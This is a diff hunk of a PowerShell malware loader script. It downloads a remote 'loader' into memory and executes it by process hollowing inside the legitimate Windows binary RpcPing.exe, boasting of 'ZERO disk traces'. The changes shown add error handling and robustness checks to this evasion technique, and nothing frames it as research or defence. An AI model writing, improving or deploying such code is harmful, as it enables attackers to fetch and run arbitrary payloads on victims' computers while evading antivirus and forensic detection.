@@ -390,18 +390,47 @@ $loaderBytes = Download-LoaderToMemory -Url $LoaderUrl
 if ($null -ne $loaderBytes -and $loaderBytes.Length -gt 0) {
     Write-Host " OK" -ForegroundColor Green
     Write-Host "Loader downloaded. Size: $($loaderBytes.Length) bytes" -ForegroundColor Green
+    
+    # Verify ProcessHollowing class is loaded
+    try {
+        $test = [ProcessHollowing]
+        Write-Host "ProcessHollowing class loaded successfully" -ForegroundColor Gray
+    }
+    catch {
+        Write-Host " FAILED" -ForegroundColor Red
+        Write-Host "Error: ProcessHollowing class not available - $($_.Exception.Message)" -ForegroundColor Yellow
+        exit
+    }
+    
     Write-Host "Executing via process hollowing (ZERO disk writes)..." -NoNewline
     
     # Execute via process hollowing - NO DISK WRITES
     $targetProcess = "C:\Windows\System32\RpcPing.exe"
-    $result = [ProcessHollowing]::HollowProcess($loaderBytes, $targetProcess)
     
-    if ($result -eq "Success") {
-        Write-Host " OK" -ForegroundColor Green
-        Write-Host "Loader executed successfully - ZERO disk traces!" -ForegroundColor Green
-    } else {
+    # Check if target process exists
+    if (-not (Test-Path $targetProcess)) {
         Write-Host " FAILED" -ForegroundColor Red
-        Write-Host $result -ForegroundColor Yellow
+        Write-Host "Error: Target process not found: $targetProcess" -ForegroundColor Yellow
+        exit
+    }
+    
+    try {
+        $result = [ProcessHollowing]::HollowProcess($loaderBytes, $targetProcess)
+        
+        if ($result -eq "Success") {
+            Write-Host " OK" -ForegroundColor Green
+            Write-Host "Loader executed successfully - ZERO disk traces!" -ForegroundColor Green
+        } else {
+            Write-Host " FAILED" -ForegroundColor Red
+            Write-Host "Error: $result" -ForegroundColor Yellow
+        }
+    }
+    catch {
+        Write-Host " FAILED" -ForegroundColor Red
+        Write-Host "Error: Exception occurred - $($_.Exception.Message)" -ForegroundColor Yellow
+        if ($_.Exception.InnerException) {
+            Write-Host "Inner exception: $($_.Exception.InnerException.Message)" -ForegroundColor Yellow
+        }
     }
 } else {
     Write-Host " FAILED" -ForegroundColor Red
